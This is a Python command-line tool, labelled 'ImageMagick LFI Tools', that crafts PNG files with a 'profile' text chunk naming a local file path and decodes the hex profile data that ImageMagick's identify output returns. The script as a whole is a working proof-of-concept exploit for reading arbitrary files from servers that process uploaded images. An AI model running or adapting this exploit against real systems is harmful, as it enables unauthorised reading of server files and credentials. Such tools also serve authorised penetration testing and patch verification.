import argparse
import subprocess
from PIL import Image, PngImagePlugin, ImageDraw
import sys


def generate(lfile, output):
    width, height = 255, 255
    text = "adhkr"

    with Image.new("RGB", (width, height), color=(0, 0, 0)) as img:
        draw = ImageDraw.Draw(img)
        text_bbox = draw.textbbox((0, 0), text)

        x = (width - text_bbox[2]) // 2
        y = (height - text_bbox[3]) // 2

        draw.text((x, y), text, fill=(255, 255, 255))

        info = PngImagePlugin.PngInfo()
        info.add_text("profile", lfile.encode("utf-8"))

        img.save(output, "PNG", pnginfo=info)


def read(input_file):
    cmd = ['identify', '-verbose', input_file]
    try:
        output = subprocess.check_output(cmd).decode('utf-8')
    except subprocess.CalledProcessError:
        print(
            f"Error: Failed to execute 'identify' command. Make sure ImageMagick is installed and the input file '{input_file}' is valid.")
        sys.exit(1)

    raw_profile_type = extract_raw_profile_type(output)
    if raw_profile_type is None:
        print("Error: Failed to extract raw profile type.")
        sys.exit(1)

    try:
        decoded_profile_type = decode_profile_type(raw_profile_type)
        if isinstance(decoded_profile_type, str):
            print(f"Decoded Profile Type: \n{decoded_profile_type}")
        elif isinstance(decoded_profile_type, bytes):
            with open('extracted', 'wb') as f:
                f.write(decoded_profile_type)
            print(f"Decoded binary data has been written to 'extracted'.")
    except ValueError:
        print(
            f"Error: Failed to decode the raw profile type.\nRaw profile type (hex):\n{raw_profile_type}")
        sys.exit(1)


def apply(input_file, lfile):
    with Image.open(input_file) as img:
        info = PngImagePlugin.PngInfo()
        info.add_text("profile", lfile.encode("utf-8"))
        output = input_file.rsplit('.', 1)[0] + "_modified.png"
        img.save(output, "PNG", pnginfo=info)
        print(
            f"Profile information inserted. Modified image saved as '{output}'.")


def extract_raw_profile_type(output):
    start_index = output.find("Raw profile type:") + len("Raw profile type:")
    end_index = output.find("signature", start_index)
    if start_index == -1 or end_index == -1:
        return None
    raw_profile_type = output[start_index:end_index].strip()
    return raw_profile_type


def decode_profile_type(raw_profile_type):
    hex_values = raw_profile_type.split("\n")
    hex_string = "".join(hex_values[1:])
    try:
        decoded_string = bytes.fromhex(hex_string).decode("utf-8")
        return decoded_string
    except UnicodeDecodeError:
        # If it's not valid UTF-8, then it might be a binary file. 
        # Return the raw bytes in that case
        return bytes.fromhex(hex_string)



def main():
    parser = argparse.ArgumentParser(
        description='ImageMagick LFI Tools - by adhkr')
    subparsers = parser.add_subparsers(dest='command')

    generate_parser = subparsers.add_parser(
        'generate', help='Generate a PoC PNG file')
    generate_parser.add_argument(
        '-l', '--lfile', help='Local file to read', required=True)
    generate_parser.add_argument(
        '-o', '--output', help='Output PNG file', required=True)

    read_parser = subparsers.add_parser(
        'read', help='Read and decode profile type from a PNG file')
    read_parser.add_argument(
        '-i', '--input', help='Input PNG file', required=True)

    apply_parser = subparsers.add_parser(
        'apply', help='Apply profile information to a PNG file')
    apply_parser.add_argument(
        '-i', '--input', help='Input PNG file', required=True)
    apply_parser.add_argument(
        '-l', '--lfile', help='Local file to insert', required=True)

    args = parser.parse_args()

    if args.command == 'generate':
        generate(args.lfile, args.output)
    elif args.command == 'read':
        read(args.input)
    elif args.command == 'apply':
        apply(args.input, args.lfile)
    else:
        parser.print_help()
        sys.exit(1)


if __name__ == '__main__':
    main()
